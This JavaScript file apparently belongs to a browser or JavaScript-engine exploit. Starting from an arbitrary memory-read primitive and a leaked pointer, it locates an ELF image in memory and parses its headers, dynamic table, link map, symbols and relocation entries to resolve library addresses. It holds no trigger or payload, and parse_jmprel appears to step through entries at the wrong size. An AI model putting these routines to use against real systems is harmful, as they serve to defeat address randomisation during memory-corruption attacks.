var ELF_MAGIC_BYTES = [0x7f, 0x45, 0x4c, 0x46];
var ELF_BASE_MASK = new Int64(0xfffff000, 0xffffffff);

// ELF Segment type Constants
var PT_NULL = 0;
var PT_LOAD = 1;
var PT_DYNAMIC = 2;
var PT_INTERP = 3;
var PT_NOTE = 4;
var PT_SHLIB = 5;
var PT_PHDR = 6;

// ELF Dynamic table constants
var DT_NULL = 0;
var DT_NEEDED = 1;
var DT_PLTRELSZ = 2;
var DT_PLTGOT = 3;
var DT_HASH = 4;
var DT_STRTAB = 5;
var DT_SYMTAB = 6;
var DT_RELA = 7;
var DT_RELASZ = 8;
var DT_RELAENT = 9;
var DT_STRSZ = 10;
var DT_SYMENT = 11;
var DT_INIT = 12;
var DT_FINI = 13;
var DT_SONAME = 14;
var DT_RPATH = 15;
var DT_SYMBOLIC = 16;
var DT_REL = 17;
var DT_RELSZ = 18;
var DT_RELENT = 19;
var DT_PLTREL = 20;
var DT_DEBUG = 21;
var DT_TEXTREL = 22;
var DT_JMPREL = 23;
var DT_BIND_NOW = 24;
var DT_INIT_ARRAY = 25;
var DT_FINI_ARRAY = 26;
var DT_INIT_ARRAYSZ = 27;
var DT_FINI_ARRAYSZ = 28;

function find_elf_base(a_read, elf_leak) {
  var elf_base = Int64.and(elf_leak, ELF_BASE_MASK);
  while (true) {
    var leak = a_read(elf_base);
    var found = true;
    for (var i = 0;i<4;i++) {
      if (leak[i] != ELF_MAGIC_BYTES[i]) {
        found = false;
        break;
      }
    }
    if (found) {
      return elf_base;
    }
    elf_base.subOp(0x1000);
  }
}

function parse_elf_header(a_read, elf_base) {
  var bytes = readUpto(a_read, elf_base, 64);
  var elf_header = {};
  var ptr = 0;
  elf_header.e_ident = bytes.slice(ptr, ptr + 16);
  ptr += 16;
  elf_header.e_type = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_machine = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_version = u32(bytes.slice(ptr, ptr + 4));
  ptr += 4;
  elf_header.e_entry = u64(bytes.slice(ptr, ptr + 8));
  ptr += 8;
  elf_header.e_phoff = u64(bytes.slice(ptr, ptr + 8));
  ptr += 8;
  elf_header.e_shoff = u64(bytes.slice(ptr, ptr + 8));
  ptr += 8;
  elf_header.e_flags = u32(bytes.slice(ptr, ptr + 4));
  ptr += 4;
  elf_header.e_ehsize = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_phentsize = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_phnum = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_shentize = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_shnum = u16(bytes.slice(ptr, ptr + 2));
  ptr += 2;
  elf_header.e_shstrndx = u16(bytes.slice(ptr, ptr + 2));
  return elf_header;
}

function parse_elf_sections(a_read, elf_base, e_shoff, e_shentize, e_shnum) {
  var section_base = Int64.add(elf_base, e_shoff);
  var sections = [];
  for (var i = 0;i<e_shnum;i++) {
    alert(section_base);
    var bytes = readUpto(a_read, Int64.add(section_base, i*e_shentize), e_shentize);
    alert(bytes);
    var ptr = 0;
    var section = {};
    section.sh_name = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    section.sh_type = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    section.sh_flags = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    section.sh_addr = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    section.sh_offset = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    section.sh_size = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    section.sh_link = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    section.sh_info = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    section.sh_addralign = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    section.sh_entsize = u64(bytes.slice(ptr, ptr + 8));
    sections.push(section);
  }
  return sections;
}

function parse_elf_segments(a_read, elf_base, e_phoff, e_phentsize, e_phnum) {
  var program_table_addr = Int64.add(elf_base, e_phoff);
  var segments = [];
  for (var i = 0;i<e_phnum;i++) {
    var bytes = readUpto(
      a_read,
      Int64.add(program_table_addr, i*e_phentsize),
      e_phentsize
    );
    var segment = {};
    var ptr = 0;
    segment.p_type = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    segment.p_flags = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    segment.p_offset = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    segment.p_vaddr = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    segment.p_paddr = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    segment.p_filesz = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    segment.p_memsz = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    segment.p_align = u64(bytes.slice(ptr, ptr + 8));
    segments.push(segment);
  }
  return segments;
}

function get_dynamic_segment(segments) {
  var dynamic_segments = [];
  for (var i = 0;i<segments.length;i++) {
    if (segments[i].p_type == PT_DYNAMIC) {
      dynamic_segments.push(segments[i]);
    }
  }
  return dynamic_segments;
}

function parse_dynamic_segment_by_addr(a_read, dynamic_segment_addr) {
  var dynamic_entries = [];
  for (var i = 0;;i++) {
    var bytes = readUpto(a_read, Int64.add(dynamic_segment_addr, i*0x10), 0x10);
    var dynamic_entry = {};
    dynamic_entry.d_tag = u64(bytes.slice(0, 8));
    if (dynamic_entry.d_tag == DT_NULL) {
      break;
    }
    dynamic_entry.d_un = u64(bytes.slice(8, 16));
    dynamic_entries.push(dynamic_entry);
  }
  return dynamic_entries;
}

function parse_dynamic_segment(a_read, elf_base, dynamic_segment) {
  var dynamic_segment_addr = Int64.add(elf_base, dynamic_segment.p_offset);
  return parse_dynamic_segment_by_addr(a_read, dynamic_segment_addr);
}

function get_type_from_dynamic(dynamic_entries, tag) {
  var entries = [];
  for (var i = 0;i<dynamic_entries.length;i++) {
    if (dynamic_entries[i].d_tag == tag) {
      entries.push(dynamic_entries[i]);
    }
  }
  return entries;
}

function get_dsymtab_from_dynamic(dynamic_entries) {
  return get_type_from_dynamic(dynamic_entries, DT_SYMTAB);
}

function get_dstrtab_from_dynamic(dynamic_entries) {
  return get_type_from_dynamic(dynamic_entries, DT_STRTAB);
}

function get_pltgot_from_dynamic(dynamic_entries) {
  return get_type_from_dynamic(dynamic_entries, DT_PLTGOT);
}

function get_jmprel_from_dynamic(dynamic_entries) {
  return get_type_from_dynamic(dynamic_entries, DT_JMPREL);
}

function get_linkmap_addr_from_pltgot(a_read, pltgot_entry) {
  var got_base_addr = pltgot_entry.d_un;
  var bytes = readUpto(a_read, Int64.add(got_base_addr, 0x8), 0x8);
  var linkmap_addr = u64(bytes);
  return linkmap_addr;
}

function parse_symbols(a_read, symtab_addr, strtab_addr, sym_name) {
  var read_addr = Int64.copy(symtab_addr);
  var i = 0;
  while (true) {
    var bytes = readUpto(a_read, read_addr, 0x18);
    var symbol = {};
    var ptr = 0;
    symbol.st_name = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    symbol.st_info = u8(bytes.slice(ptr, ptr + 1));
    ptr += 1;
    symbol.st_other = u8(bytes.slice(ptr, ptr + 1));
    ptr += 1;
    symbol.st_shndx = u16(bytes.slice(ptr, ptr + 2));
    ptr += 2;
    symbol.st_value = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    symbol.st_size = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    symbol.str = readStr(
      a_read,
      Int64.add(strtab_addr, symbol.st_name)
    );
    symbol.idx = i;
    read_addr.addOp(0x18);
    i += 1;
    if (symbol.str.indexOf(sym_name) !== -1) {
      return symbol;
    }
  }
}

function parse_jmprel(a_read, jmprel_addr, sym_idx) {
  var read_addr = Int64.copy(jmprel_addr);
  while (true) {
    var bytes = readUpto(a_read, read_addr, 0x18);
    var jmprel = {};
    var ptr = 0;
    jmprel.r_offset = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    jmprel.r_info_tag = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    jmprel.r_info_sym_idx = u32(bytes.slice(ptr, ptr + 4));
    ptr += 4;
    jmprel.r_addend = u64(bytes.slice(ptr, ptr + 8));
    if (sym_idx == jmprel.r_info_sym_idx) {
      return jmprel;
    }
    read_addr.addOp(8);
  }
}

function parse_libraries(a_read, linkmap_addr) {
  var libraries = [];
  var current_addr = linkmap_addr;
  while (current_addr != 0) {
    var bytes = readUpto(a_read, current_addr, 0x8*5);
    var library = {};
    var ptr = 0;
    library.l_addr = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    library.l_name = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    library.l_ld = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    library.l_next = u64(bytes.slice(ptr, ptr + 8));
    ptr += 8;
    library.l_prev = u64(bytes.slice(ptr, ptr + 8));
    library.name = readStr(a_read, library.l_name);
    libraries.push(library);
    current_addr = library.l_next;
  }
  return libraries;
}

function get_library_by_name(libraries, name) {
  for (var i = 0;i<libraries.length;i++) {
    if (libraries[i].name.indexOf(name) !== -1) {
      return libraries[i];
    }
  }
}

/*
Elf64_Addr 8 8 Unsigned program address
Elf64_Off 8 8 Unsigned file offset
Elf64_Half 2 2 Unsigned medium integer
Elf64_Word 4 4 Unsigned integer
Elf64_Sword 4 4 Signed integer
Elf64_Xword 8 8 Unsigned long integer
Elf64_Sxword 8 8 Signed long integer
unsigned char 1 1 Unsigned small integer
*/
